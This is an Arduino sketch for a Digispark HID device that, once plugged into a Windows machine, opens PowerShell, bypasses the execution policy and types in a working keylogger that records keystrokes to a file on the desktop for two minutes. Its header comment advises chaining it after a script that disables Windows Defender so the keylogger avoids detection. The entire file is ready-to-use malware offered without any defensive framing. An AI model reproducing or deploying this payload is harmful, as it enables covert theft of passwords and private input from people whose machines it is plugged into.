/* 
 *  This DigiKeyboard Script runs Powershell keylogger for a predefined number of 2 minutes (you can change it according to your needs in the powershell command) and saves the results to test.txt (you can change it according to your wish) in 
 * WARNING: Windows Defender is able to detect this so you will have to chain this after a script disabling Windows Defender.
 
 */


#include "DigiKeyboard.h"

void setup() {
  //empty
}

void loop() {
  // Open PowerShell
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.print(F("Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.print(F("Get-ExecutionPolicy -List"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);

// Write Keylogger Function
  DigiKeyboard.print(F("$code={function My-Keypresses($Path=\"$env:USERPROFILE\\Desktop\\test.txt\"){$sig='[DllImport(\"user32.dll\",CharSet=CharSet.Auto,ExactSpelling=true)]public static extern short GetAsyncKeyState(int virtualKeyCode);[DllImport(\"user32.dll\",CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport(\"user32.dll\",CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode,int uMapType);[DllImport(\"user32.dll\",CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey,uint wScanCode,byte[] lpkeystate,System.Text.StringBuilder pwszBuff,int cchBuff,uint wFlags);';$API=Add-Type -MemberDefinition $sig -Name 'Win32' -Namespace API -PassThru;New-Item -Path $Path -ItemType File -Force|Out-Null;try{while($true){Start-Sleep -Milliseconds 40;for($ascii=9;$ascii-le 254;$ascii++){$state=$API::GetAsyncKeyState($ascii);if($state-eq -32767){$vk=$API::MapVirtualKey($ascii,3);$kbstate=New-Object Byte[] 256;$API::GetKeyboardState($kbstate)|Out-Null;$mychar=New-Object -TypeName System.Text.StringBuilder;$success=$API::ToUnicode($ascii,$vk,$kbstate,$mychar,$mychar.Capacity,0);if($success-gt 0){[System.IO.File]::AppendAllText($Path,$mychar.ToString(),[System.Text.Encoding]::Unicode)}}}}}finally{}};My-Keypresses};$timeoutSeconds=120;$j=Start-Job -ScriptBlock $code;if(Wait-Job $j -Timeout $timeoutSeconds){Receive-Job $j};Remove-Job -Force $j"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}